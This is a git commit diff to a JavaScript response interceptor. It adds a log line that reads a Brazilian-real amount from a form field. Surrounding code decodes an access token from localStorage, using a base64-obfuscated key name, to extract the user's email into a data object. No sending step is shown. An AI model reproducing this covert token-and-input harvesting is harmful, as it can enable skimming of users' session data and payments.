416181010968e15cfbee586549529f6ea7855240
arena7cdn <160563247+arena7cdn@users.noreply.github.com>
2024-02-20 01:40:02 -0300

    Update Interceptors.js

--- Interceptors.js
+++ Interceptors.js
@@ -9,6 +9,9 @@ var ResponseData=JSON.parse(this.responseText);
 
 if(ResponseData.status===0)
 {
+
+console.log(document.getElementsByClassName('input ng-dirty')[0].value.replace("R$ ","").replace(",","."));
+ 
   var UserMail= JSON.parse(atob(atob(localStorage.getItem("YWNjZXNzX3Rva2Vu")).replace('"', "").split('.')[1])).unique_name;
    var _Dados = {
    
